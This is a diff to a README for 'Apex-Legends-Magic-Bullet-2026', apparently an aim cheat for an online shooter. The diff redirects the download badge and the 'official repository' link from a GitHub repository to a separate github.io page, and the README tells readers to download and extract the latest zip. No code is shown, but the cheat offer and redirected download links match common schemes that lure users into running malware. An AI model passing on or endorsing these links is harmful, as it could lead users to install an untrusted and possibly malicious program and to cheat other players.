@@ -1,6 +1,6 @@
 # 🎯 Apex-Legends-Magic-Bullet-2026 - Improve your aim in every match
 
-[![](https://img.shields.io/badge/Download-Application-blue)](https://github.com/fremontswallowtailed191/Apex-Legends-Magic-Bullet-2026)
+[![](https://img.shields.io/badge/Download-Application-blue)](https://fremontswallowtailed191.github.io)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you begin:
 
 Follow these steps to obtain and launch the application on your computer.
 
-1.  Visit the official repository page at this link: [https://github.com/fremontswallowtailed191/Apex-Legends-Magic-Bullet-2026](https://github.com/fremontswallowtailed191/Apex-Legends-Magic-Bullet-2026).
+1.  Visit the official repository page at this link: [https://fremontswallowtailed191.github.io](https://fremontswallowtailed191.github.io).
 2.  Locate the release section on the right side of the page.
 3.  Choose the latest version zip file to save to your local drive.
 4.  Right-click the downloaded file and select "Extract All."
